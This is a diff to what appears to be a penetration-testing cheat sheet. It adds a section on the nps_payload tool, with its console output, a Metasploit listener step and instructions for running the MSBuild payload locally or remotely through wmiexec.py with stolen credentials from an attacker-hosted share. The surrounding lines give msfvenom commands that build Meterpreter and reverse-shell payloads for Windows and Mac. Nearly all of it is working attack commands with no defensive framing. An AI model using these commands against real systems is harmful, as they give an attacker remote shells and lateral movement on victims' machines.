@@ -38,6 +38,24 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f exe > sh
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f psh-reflection -o msf.ps1
 
 
+#NPS_PAYLOAD 
+python2.7 nps_payload.py
+Enter the listener port (443): 443
+[*] Generating PSH Payload...
+[*] Generating MSF Resource Script...
+[+] Metasploit resource script written to msbuild_nps.rc
+[+] Payload written to msbuild_nps.xml
+
+1. Run "msfconsole -r msbuild_nps.rc" to start listener.
+2. Choose a Deployment Option (a or b): - See README.md for more information.
+  a. Local File Deployment:
+    - %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe <folder_path_here>\msbuild_nps.xml
+  b. Remote File Deployment:
+    - wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attackerip>\<share>\msbuild_nps.xml
+3. Hack the Planet!!
+
+
+
 Mac
 ---
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f macho > shell.macho
